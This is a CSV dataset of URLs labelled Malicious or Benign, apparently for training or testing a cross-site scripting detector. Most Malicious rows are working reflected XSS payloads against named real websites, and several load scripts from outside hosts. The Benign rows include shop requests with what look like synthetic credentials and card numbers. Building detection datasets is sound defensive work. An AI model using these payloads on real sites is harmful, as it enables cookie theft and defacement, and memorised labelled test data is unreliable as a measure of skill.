Payloads,Class
http://www.rapsheet.com/reviews.php?subaction=showfull&amp;id=1075697587&amp;archive=&lt;script&gt;alert(document.<br>cookie)&lt;/script&gt;,Malicious
http://www.broadcastpapers.com/whitepapers/dvb-rct-a-standard-for-interactive-dvb-t.cfm?objid=&quot;&gt;&lt;scr<br>ipt&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.laprovinciadicomo.it/stories/archive/archivio/2011/1/?search_text=--%3e%3cscript%3ealert%<br>28document.cookie%29%3b%3c%2fscript%3e%3c!--&amp;x=10&amp;y=7,Malicious
http://kerchebaecker.de/galerie/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://voyances-suisse.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.usedsaxes.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.caligari.com/gallery/imagesgallery/2008/nov/image.asp?cate=gimages&amp;img=3874&amp;email=holding<br>on2jc@yahoo.com&amp;name=collin%20wunderlich}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%<br>3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.xpress.jo/site_search.asp?search=%3e%22%3e%3cscript%3ealert%28%27xss%20-%20vuln%27%29%3c%<br>2fscript%3e,Malicious
http://www.waffleclub.com/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;st@<br>rext&lt;/h1&gt;,Malicious
http://www.artboomers.org/gallery.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script%<br>3e,Malicious
http://www.wwf.org.za/index.cfm?uglobalsearch=%22%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious
http://www.osce.org/search/?displaymode=3&amp;lsi=1&amp;q=%22%3e%27%3e%3cscript%3ealert%28string.fromcharcod<br>e%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%3c%2fscript%3e&amp;go=go,Malicious
http://rickdepalma.mfr.mlxchange.com/middletier/errorpage.asp?fatal=0&amp;severity=3&amp;category=3&amp;eventid=<br>3201&amp;hideresetbtn=0&amp;hidedetails=1&amp;msg=%3e%22%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%<br>3ealert('norehem%20was%20here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20h<br>ere%3c/marquee%3e%3c/h1%3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/<br>forocibernautica/upload/norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/x<br>ss.html%20%3c,Malicious
http://www.raulsandoval.com/charlie/igallery31/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.esportboard.de/forum/ankuendigungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://ituned.in/search.php?q=%22%3e%3cscript%3ealert(%22w0ot%22)%3c/script%3e&amp;sc=all,Malicious
http://www.fo12.dswd.gov.ph/search.php?keyword=\%22%3cscript%3ealert(/xssed%20by%20dr.optix%20:%20ww<br>w.r-secure.com/)%3c/script%3e&amp;submit=go,Malicious
http://www.alex10.com.br/alex10/tr2/erro.asp?msg=&lt;script&gt;alert(&quot;alex kanqa sitende xss var sampiyon<br>fenerbahce&quot;)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious
http://www.buy-host.com/forums/news-updates/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;,Malicious
http://www.antenna.gr/webtv/register?ref=http://www.antenna.gr/tv/default.aspx'&quot;&gt;&lt;script&gt;alert(docum<br>ent.cookie)&lt;/script&gt;,Malicious
http://www.hackaday.com/search/?q=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3ch1%3eby%20<br>st@rext%20www.trtekforum.com%20www.raptr.us.tc%3cbr%3e%20your%20site%20xssed%20you%20big%20lamer%3c/<br>h1%3e,Malicious
http://www.vandermerwes.com/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fanello.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor<br>&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.getjar.com/software/universal/all/search/%5c%22%3e%3cscript%3ealert%28123%29%3c%2fscript%<br>3e,Malicious
http://www.beyazonline.com/videolargoster.asp?no=1&amp;baslik=&lt;script&gt;alert(&quot;scriptorium(turkey)%20hackh<br>aber.com&quot;)&lt;/script&gt;,Malicious
http://www.acs.org.au/index.cfm?action=message&amp;msgcode=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;<br>by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.fsis.usda.gov/search/search_results/index.asp?q=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2f<br>script%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;mode=simple&amp;num=10&amp;as_occt=a<br>ny&amp;x=0&amp;y=0&amp;site=default_collection&amp;sort=rel,Malicious
http://www.libreriasanmiguel.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity<br>)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://geo.fotolog.com/directory?state=h9&amp;city=london&amp;country=&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/scr<br>ipt&gt;,Malicious
"http://www.imdb.com/name/nm1083271/mediaindex?page=2""></a><script>alert(1);</script>",Malicious
http://government.zdnet.com/index.php?kw=%22%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e<br>&amp;page_id=1592,Malicious
http://www.fredmiranda.com/reviews/index.php?cat=3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)<br>%3b%3c/script%3e,Malicious
http://www.supererotikshop.com/shop/default.asp?gb=urun&amp;id=293&amp;ortak=%22%3e%3cscript%3ealert(%22back<br>door%22)%3c/script%3e,Malicious
http://www.kingsrowantiquecenter.com/gallery/igallery.asp?d=%&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://expressdecor.com.au/igallery/login.asp?folder=works&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://uni16.ogame.de/game/redir.php?url=http://%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
http://www.school.obec.go.th/khokklang/guestbook/admin.php?id=859%27%3e%22%3e%3ciframe%20src%3dhttp%<br>3a%2f%2fkusomiso%2ecom%2fxss%2ehtml%20%3c,Malicious
http://thebestpageintheuniverse.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%5<br>8%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e&amp;c=1&amp;p=1&amp;r=1182<br>338376721,Malicious
http://espresso.repubblica.it/go?page=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3b%3c%2fsc<br>ript%3e,Malicious
http://blog.wendyincuracao.nl/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%<br>3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://darklords.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://noticias.uol.com.br/busca/?q=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e&rd=1&id=1&ads=on&ref=noticias_uol#q=ssssss,Malicious
http://www.musikverein.at/jugend/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;<br>marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://gov.gov.md/md/comunicate/?nid=%22%3e%3cscript%3ealert(/educational%20purpose%20only/)%3c/scri<br>pt%3e&amp;y=2009&amp;m=04,Malicious
http://www.alexnursing.edu.eg/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/script<br>%3e,Malicious
http://www.erdemofis.com/haberdetails.asp?id=5&amp;baslik=katalog&lt;script&gt;alert(&quot;cyber_thief(turkey)%20ha<br>ckhaber.com&quot;)&lt;/script&gt;,Malicious
http://www.infoexport.gc.ca/iei/search.jsp?sitid=3%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://siam99.servepics.com/webpic/list.php?id=1&amp;page=1&amp;pic=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://www.helpdesk.eti.br/orcs/show_descr.php?id=200&amp;cliente=%3cscript%3ealert(666);%3c/script%3e,Malicious
http://www.dpv.de/cgi/runtime/engine/?search=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;action=sea<br>rch,Malicious
http://www.albanyindustries.com/email.asp?action=email&amp;email=coreykauffman@yahoo.com&amp;name=corey%20ka<br>uffman%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20b<br>y%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.cappa27.com/index.php/pmwikifr/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(1)&gt;,Malicious
http://www.toplaughs.com/games.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious
http://www.nkth.gov.hu/main.php?folderid=772&amp;iid=100&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;se<br>arch=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was<br>_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3<br>e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520s<br>ize%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%25<br>20here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok2<br>fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok,Malicious
http://www.publishershomepages.com/php/order/orders.asp?co=1164518&amp;em=aroberson2000@yahoo.com%27%22%<br>3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3<br>c/h1%3e%3c/marquee%3e,Malicious
https://www.laut.de/cgi-bin/newsletter/s.pl?l=1&amp;subscribe=subscribe&amp;e=%22%3e%3cscript%3ealert%281%29<br>%3c%2fscript%3e,Malicious
http://fire.lacounty.gov/search.asp?searwords=totalschaden%3cscript%3ealert%28%22totalschaden%22%29%<br>3c%2fscript%3e&amp;send=search,Malicious
http://www.cs.princeton.edu/research/techreps/%22%3e%3c/script%3e%3cscript%3ealert%28document.cookie<br>%29%3c/script%3e%3cscript%3ealert%28/xssed%20by%20ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.karlosnet.com/general/buscador.php?busc=%3cscript%3ealert(1)%3c%2fscript%3e&amp;i=0&amp;image.x=0<br>&amp;image.y=0,Malicious
http://www.help.edu.my/facebook/inc/error.php?error=%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.ba.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.vattenfall.de/de/kontakt.htm?mailto=10770&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;conta<br>ctfrom=corporate-governance.htm,Malicious
http://www.hiho.ro/cauta_muzica.php?q=%3cscript%3ealert(/dr.optix/)%3c/script%3e,Malicious
http://exipnimetakinisi.e-transport.gov.gr/simplesearch.asp?keyword=%3cscript%3ealert%28string.fromc<br>harcode%2883%2c116%2c64%2c82%2c45%2c103%2c97%2c90%2c51%2c114%29%29%3c%2fscript%3e%3cmarquee%3e%3ch1%<br>3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;section=1,Malicious
http://www.wqmzj.gov.cn/acceptjob.asp?job=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://myboard.jp/i/plus_menu_view.php?pm_no='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3<br>c/script%3e,Malicious
http://www.uo.com/cgi-bin/search.pl?words='%3e%3cscript%3ealert(1337)%3c/script%3e%3cb%20,Malicious
http://indiatube.apnicommunity.com/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/script%3e+pwn,Malicious
http://www.myshtuff.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;ba<br>ckdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ciceksiparisi.com/zenkategori.asp?kat=gul%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
"http://md.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://resources.cisco.com/app/error.taf?_function=errorreturn&amp;errormessage=&lt;script&gt;alert('www.sec-r<br>1z.com')&lt;/script&gt;,Malicious
http://www.jugements.qc.ca/index.php?type=listemc&amp;recher=0_%3cscript%3ealert%28document.cookie%29%3c<br>%2fscript%3e_0__pert,Malicious
http://www.churchilltrust.com.au/news.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br>3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://virgulinha.terra.com.br/cadastro/cadastro.php?referer=%22%3e%3cscript%3ealert(123)%3c/script%<br>3e%22,Malicious
http://www.infobae.com/notas/nota.php?idx=337863&amp;idxseccion=0=%22%3e%3ciframe%20src=http://www.googl<br>e.com/%3e%3c/iframe%3e=%22%3e%3ciframe%20src=http://www.google.com/%3e%3c/iframe%3e,Malicious
http://www.cs.chalmers.se/cs/research/functional/multilib/haskellcgi/show-haskell.cgi?file=../haskel<br>lcgi/show-haskell.cgi&amp;title=%3e%3ctitle%3enorehem%20was%20here%3c/title%3e%3cscript%3edocument.write<br>('norehem%20was%20here')%3c/script%3e%3cmarquee%3e%3ch1%3enorehem%20was%20here%3c/h1%3e%3c/marquee%3<br>e%3cimg%20src=%22http://mexico.udg.mx/politica/simbolospatrios/imagen/bandera2.gif%22%3e%3cscript%3e<br>alert%20('norehem%20was%20here')%3c/script%3e%3c,Malicious
http://www.kanalvip.com.tr/seri_grup_detay.asp?id=7&amp;baslik=%c4%b0%c5%9f%20ar%c4%b1yorum&lt;script&gt;alert<br>(&quot;cyber_thief(turkey)%20hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://111.com/dns/search.php?domain=%22%3e%3ch1%3eby+st@rext&lt;script&gt;alert(1)&lt;/script&gt;,Malicious
http://staatsbibliothek-berlin.de/deutsch/suche/suche.php?id=7&amp;query=%27%3e%3e%3cmarquee%3e%3ch1%3ex<br>ss%20xss%20xss%20xss%20xss%20xss%3c%2fh1%3e%3c%2fmarquee%3e&amp;case=&amp;whole=&amp;lines=&amp;errors=&amp;age=&amp;maxfile<br>s=25&amp;maxlines=20&amp;maxchars=1000&amp;filter=&amp;cache=yes&amp;rankby=default,Malicious
http://www.flickr.com/map/?&amp;tag=cheese%22%3e%3cscript%20src=http://ha.ckers.org/s.js%3e%3c/script%3e,Malicious
http://www.webmasters.org/scripts/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www6.senado.gov.br/pesquisa/preparapesquisabasica.action?argumento=%3e%22%3e%3ciframe%20src=%<br>22http://xssed.com%22%3e&amp;executa=juza,Malicious
http://www.wcheshirepct.nhs.uk/default.asp?page=search.asp&amp;searchterm=&lt;script&gt;alert(&quot;virtual_system&quot;<br>)&lt;/script&gt;,Malicious
http://recaq.com/html/index_done.php?url=&lt;script&gt;alert(1);&lt;/script&gt;&amp;short_url=&lt;script&gt;alert(1);&lt;/scr<br>ipt&gt;,Malicious
http://xfire.adbureau.net/hserver/acc_random=4057122761/aamsz=23%27%22%3e%3c/title%3e%3cscript%3eale<br>rt%281337%29%3c/script%3e4x60/area=app/geo=250/co=250/lg=4216/mp=4363/age=18/gen=m/ga=/ga=4331/ga=53<br>74/pageid=4713086747,Malicious
http://finance.sponser.co.il/finance/search/search.php?q=%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
http://ms138.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://aix.ee.eng.deu.edu.tr/search.php?query=sinav%22%3e%3cscript%3ealert%28%22taberani%22%29%3c%2f<br>script%3e&amp;topic=&amp;category=0&amp;author=&amp;days=0&amp;type=stories,Malicious
http://www.espace-plus.net/pub_disclamer.php?synergie=%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c<br>/script%3ehetero&amp;lg=fr%27%22%3e%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c/script%3e/title%3e%3cs<br>cript%3ealert(111)%3c/script%3e&amp;age=0%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c/script%3e&amp;rencon<br>tre=%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c/script%3e&amp;no=http%3a%2f%2fdingophone.sonnerie.net<br>&amp;yes=http%3a%2f%2fwww.zone-adulte.net%2fvideo%2fvideos-3-1049426-pdv3selfdailyunlog300x250general22n<br>ovembergeneraliste.php%3ftracker%3dselfdailyunlog-300x250-general-22-november_redir_0_0%26id%3d51120<br>&amp;scrolls=%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c/script%3e&amp;exit=%27%22%3e%3c/title%3e%3cscrip<br>t%3ealert(111)%3c/script%3e1&amp;exit_url=http%3a%2f%2foutils.yes-messenger.com%2fpdv4.php%3fe%3d1%26w%3<br>d0%26tracker%3dselfdailyunlog-300x250-general-22%27%22%3e%3c/title%3e%3cscript%3ealert(111)%3c/scrip<br>t%3e-november_pop_0_0%26id%3d51120&amp;exit_type=under&amp;tracker=selfdailyunlog-300x250-%27%22%3e%3c/title<br>%3e%3cscript%3ealert(111)%3c/script%3egeneral-22-november_redir_0_0&amp;disc_exit=%27%22%3e%3c/title%3e%<br>3cscript%3ealert(111)%3c/script%3e1,Malicious
http://amb.vis.ne.jp/mozilla/scrapbook/tips.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.infosdelaplanete.org/article.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/scri<br>pt%3e,Malicious
http://www.vault.com/companies/searchresult.jsp?function_id=73&amp;surveytype=salary&amp;functiontitle=syste<br>ms%20administration%20(sys%20admin)%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.lbc.edu/public/alumni.07/career_results.php?category=5&amp;name=general%22%3e%22%3e/r0hit/%3e<br>%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=http://iblog.ir/style.js%3e%3c/script<br>%3e,Malicious
http://www.xixixi.jp/xixixi2/j/pwd_send.php?mno=&amp;scd=1&amp;sk=1&amp;idp=&amp;qs=%22%3e'%3e%3cscript%3ealert('x')<br>%3c/script%3e,Malicious
"http://www-angler.larc.nasa.gov/cgi-bin/site/showdoc?mnemonic=%3cscript%3ealert(%22xss%20with%20musi<br>c%20by%20sony%22)%3c/script%3e%3cscript%3ealert(%22insecurity%20romania%22)%3c/script%3e%3cscript%3e<br>alert(%22presented%20singing%20nasa,applause!%22)%3c/script%3e%3ciframe%20src%20=http://www.youtube.<br>com/watch?v=9hmry8jysdg%22%20width=%220%22%20height=%220%22%20\%3e%3c/div%3e%22%3e",Malicious
http://www.979therock.com/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
"http://horoscopo.ego.globo.com/ctl.php?mdl=sinastria&amp;cmd=%22%3e'%3e%3cscript%3ealert(string.fromchar<br>code(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.pcwelt.de/index.cfm?action=extendedsearch&amp;query=&amp;pid=930&amp;yeardateto=%22%3e%3cscript%3eale<br>rt%28%22i-landet%22%29%3c%2fscript%3e%3c%22,Malicious
http://www.djkratz.net/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://info.alexa.com/data/details/contact_info?url=http://kusomiso.com/'%3e%22%3e%3c/script%3e%3csc<br>ript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.wikihow.com/change-your-username-on-ourworld&t=1396648187492&n=5955195&k=mainentity,Benign
http://www.wikihow.com/post-a-general-status-message-update-on-goodreads&t=1396629674234&n=5429065&k=mainentity,Benign
http://www.wikihow.com/get-new-clothes-for-a-toontown-online-toon&t=1396648007960&n=5947507&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shakeri&pwd=6error&remember=on&b1=entrar,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=villarea&pwd=alambicadamente&remember=on&b1=entrar,Benign
http://www.wikihow.com/read-a-graphic-novel-insightfully&t=1396633220324&n=5520262&k=mainentity,Benign
http://www.wikihow.com/chop-onion-with-the-vegetable-chopper&t=1396546015472&n=1674396&k=mainentity,Benign
http://www.wikihow.com/become-a-you-kid&t=1396630085356&n=5445605&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=639&b1=pasar+por+caja,Benign
http://www.wikihow.com/cook-turkish-style-beans-or-vegetables-with-olive-oil&t=1396517774181&n=340251&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dambenie&password=temedor&nombre=felicia&apellidos=peleij%e0+marcapura&email=linkletter.eudal%40koinup.km&dni=85022782q&direccion=oriana+67+&ciudad=tahal&cp=10883&provincia=c%e1diz&ntc=8611196070656706&b1=registrar,Benign
http://www.wikihow.com/reduce-the-stress-of-parenting&t=1396594488096&n=3938417&k=mainentity,Benign
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hendryck&password=malav4n5657&nombre=romanela&apellidos=canovas+jodar&email=ziegel.beverly%40kpincentives.vu&dni=03263111d&direccion=marte+44+&ciudad=meis&cp=10137&provincia=burgos&ntc=7454500014712200&b1=registrar,Benign
http://www.wikihow.com/make-a-dog-adore-you&t=1396516704698&n=267368&k=mainentity,Benign
http://www.wikihow.com/follow-someone-on-twitter&t=1396629900388&n=5438161&k=mainentity,Benign
http://www.wikihow.com/choose-to-be-a-christian&t=1396570298038&n=2941529&k=mainentity,Benign
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8800&b1=pasar+por+caja,Benign
http://www.wikihow.com/create-an-account-on-ask.fm&t=1396630033142&n=5443413&k=mainentity,Benign
http://www.wikihow.com/take-care-of-a-labrador-puppy&t=1396516786938&n=271000&k=mainentity,Benign
http://www.wikihow.com/avoid-common-mistakes-when-playing-xcom:-ufo-defense&t=1396648491416&n=5968267&k=mainentity,Benign
http://www.wikihow.com/get-your-sim%27s-aspiration-bar-full&t=1396648720225&n=5979471&k=mainentity,Benign
http://www.wikihow.com/build-a-media-centre&t=1396527442042&n=834306&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=schooley&pwd=oprobiar&remember=off&b1=entrar,Benign
http://www.wikihow.com/be-the-%22fun-one%22-in-a-group-of-friends&t=1396630498836&n=5459771&k=mainentity,Benign
http://www.wikihow.com/make-green-apple-bubble-bath&t=1396593280785&n=3878104&k=mainentity,Benign
http://www.wikihow.com/do-rpgs-on-howrse.com&t=1396648035250&n=5948679&k=mainentity,Benign
http://www.wikihow.com/make-sweet-walnut-pastry&t=1396595073938&n=3972503&k=mainentity,Benign
http://www.wikihow.com/make-a-gold-style&t=1396517272930&n=302673&k=mainentity,Benign
http://www.wikihow.com/create-a-hard-online-game-using-roblox&t=1396647868744&n=5940531&k=mainentity,Benign
http://www.wikihow.com/keep-active-on-roblox&t=1396647897713&n=5941755&k=mainentity,Benign
http://www.wikihow.com/change-to-the-grid-view-in-craigslist&t=1396629956017&n=5440349&k=mainentity,Benign
http://www.wikihow.com/tell-what-browser-i%27m-using&t=1396532437759&n=1065242&k=mainentity,Benign
http://www.wikihow.com/create-pc-games-with-stencylworks&t=1396534020886&n=1139721&k=mainentity,Benign
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=terrie&pwd=39av5s9r&remember=off&b1=entrar,Benign
http://www.wikihow.com/avoid-becoming-a-victim-of-a-craigslist-scam&t=1396629952378&n=5440205&k=mainentity,Benign
http://www.wikihow.com/earn-diamonds-on-animal-jam&t=1396648268704&n=5958919&k=mainentity,Benign
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vanny&password=a93ay3z&nombre=read&apellidos=guimera+faraco&email=cattell.shek%40kecole.tn&dni=54246107d&direccion=encina+35%2c+&ciudad=santa+cruz+de+gr%edo&cp=02802&provincia=guadalajara&ntc=4267168279612946&b1=registrar,Benign
